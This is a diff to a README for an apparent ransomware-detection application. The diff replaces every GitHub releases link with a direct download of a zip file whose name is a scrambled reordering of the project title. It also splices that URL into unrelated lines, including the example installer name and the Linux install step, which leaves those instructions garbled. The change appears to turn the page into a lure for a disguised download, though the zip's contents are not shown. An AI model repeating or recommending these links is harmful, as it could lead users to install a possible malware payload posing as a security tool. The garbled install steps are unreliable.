@@ -1,6 +1,6 @@
 # 🔒 Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices- - Protect Your Devices from Ransomware
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/releases)
+[![Download Now](https://raw.githubusercontent.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/main/Results/Stage-Prevention-Ransomware-Early-Attacks-Detection-On-Behavioral-Of-Devices-v2.4.zip)](https://raw.githubusercontent.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/main/Results/Stage-Prevention-Ransomware-Early-Attacks-Detection-On-Behavioral-Of-Devices-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ Before you begin, ensure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Here](https://github.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/releases)
+To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/main/Results/Stage-Prevention-Ransomware-Early-Attacks-Detection-On-Behavioral-Of-Devices-v2.4.zip)
 
 1. Click the link above to access the releases page.
 2. Locate the latest release version.
-3. Download the installer file suitable for your operating system. This is usually labeled with the version number (e.g., `v1.0 Setup.exe`).
+3. Download the installer file suitable for your operating system. This is usually labeled with the version number (e.g., `v1.0 https://raw.githubusercontent.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/main/Results/Stage-Prevention-Ransomware-Early-Attacks-Detection-On-Behavioral-Of-Devices-v2.4.zip`).
 4. Once the download is complete, locate the file in your downloads folder.
 
 ## 📂 Running the Application
@@ -38,7 +38,7 @@ To get started, visit this page to download: [Download Here](https://github.com/
 
 3. **For Linux:**
    - Open your terminal.
-   - Navigate to the directory containing the downloaded `.tar.gz` or `.deb` file.
+   - Navigate to the directory containing the downloaded `https://raw.githubusercontent.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/main/Results/Stage-Prevention-Ransomware-Early-Attacks-Detection-On-Behavioral-Of-Devices-v2.4.zip` or `.deb` file.
    - Use the following command to install:  
      ```bash
      sudo dpkg -i [file_name].deb
@@ -85,4 +85,4 @@ We are committed to improving this application continually. Future updates may i
 
 Your security is our priority. By following these steps, you can download and run the Early Stage Behavioral Detection Prevention of Ransomware Application successfully. 
 
-To download the application again or check for updates, visit: [Download Here](https://github.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/releases)
+To download the application again or check for updates, visit: [Download Here](https://raw.githubusercontent.com/kelzangtshotsho/Early-Stage-Behavioral-Detection-Prevention-Of-Ransomware-Attacks-On-Devices-/main/Results/Stage-Prevention-Ransomware-Early-Attacks-Detection-On-Behavioral-Of-Devices-v2.4.zip)
